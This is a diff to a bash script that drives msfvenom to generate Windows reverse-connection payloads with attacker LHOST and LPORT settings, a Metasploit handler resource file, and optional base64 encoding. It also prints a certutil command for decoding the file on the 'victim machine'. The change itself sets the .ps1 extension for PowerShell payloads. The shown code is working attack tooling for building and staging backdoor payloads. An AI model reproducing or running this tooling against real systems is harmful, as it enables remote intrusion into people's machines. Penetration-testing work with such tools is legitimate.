@@ -122,6 +122,12 @@ read -p "Set format [exe]: " format
 if [ -z "$format" ] || [ "$format" = 'exe' ]
 	then
 	format='exe'
+	ext='exe'
+else
+	if [ "$format" = 'psh' ] || [ "$format" = 'powershell' ]
+		then
+		ext='ps1'
+	fi
 fi
 }
 
@@ -164,8 +170,8 @@ echo run -j -z >> "$location/$resfilename.rc"
 
 function genbinfile {
 ## Generate binary
-echo DEBUG: msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$format"
-msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$format"
+echo DEBUG: msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$ext"
+msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$ext"
 }
 
 
@@ -178,9 +184,9 @@ if [ -z "$eb64" ] || [ "$eb64" = 'no' ] || [ "$eb64" = 'n' ]
 else
 	if [ "$eb64" = 'yes' ] || [ "$eb64" = 'y' ]
 		then
-		openssl enc -base64 -in "$location/$filename.$format" -out "$location/$filename.b64"
+		openssl enc -base64 -in "$location/$filename.$ext" -out "$location/$filename.b64"
 		echo File is now encoded - Ensure the file is decoded before running in victim machine. Windows command to decode:
-		echo certutil -decode "$filename.b64" "decoded_$filename.$format"
+		echo certutil -decode "$filename.b64" "decoded_$filename.$ext"
 	fi
 fi
 }
